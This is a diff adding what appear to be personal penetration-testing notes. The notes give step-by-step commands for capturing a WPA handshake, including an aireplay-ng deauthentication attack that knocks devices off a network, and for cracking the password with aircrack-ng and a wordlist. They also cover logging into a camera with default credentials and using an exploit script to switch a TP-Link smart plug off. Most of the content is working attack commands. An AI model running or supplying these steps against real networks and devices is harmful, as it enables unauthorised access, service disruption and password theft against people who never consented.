@@ -1,0 +1,45 @@
+ 
+Airmon-ng start wlan1
+ # this starts the interface in monitor mode
+
+airodump-ng wlan1mon 
+# see BSSID and channel number
+
+airodump-ng -c <channel number> --bssid 00:01:02:03:04:05 -w <filename> <mon interface>
+# now we have a bunch of stuff
+# we need to maintain this capture then conduct a deauth attack. While we are doing the deauth attack, we want to capture all of the devices re-authenticating.
+
+aireplay-ng --deauth 0 -a 00:01:02:03:04:05 <interface>
+# we are conducting a deauth attack in order to force normal devices on the network to deauth from the network
+# once the devices have de-authed, we want to capture the handshake they are making to re-auth onto the wifi router
+# wait on the capture until you see a handshake to the WIFI router
+# now that you have the capture with the handshake
+
+Aircrack-ng <capturefile> -w <wordlist>
+#Cracking the password
+
+YOU WILL NEED TO CHANGE THE ADAPTER TO BE OUT OF MONITOR MODE IN ORDER TO DO ANYTHING ELSE TO THE NETWORK
+
+wifite 
+# is alternative tool on kali that literally just walks you through it
+
+
+## log into the camera
+Access via http, default creds are admin:<empty>
+Exploit:
+https://github.com/softScheck/tplink-smartplug
+
+./tplink_smartplug.py -t <ip of smartplug> -p 9999<default port> -c info
+./tplink_smartplug.py -t <ip of smartplug> -p 9999<default port> -c off
+
+## extracting files via SCP
+
+scp user@remotehost:/home/user/file_name
+scp -r user@remotehost:/home/user/file_name/ .
+
+References:
+https://www.aircrack-ng.org/doku.php?id=newbie_guide
+https://www.aircrack-ng.org/doku.php?id=aireplay-ng
+https://www.aircrack-ng.org/doku.php?id=cracking_wpa
+
+https://nmap.org/book/man-briefoptions.html
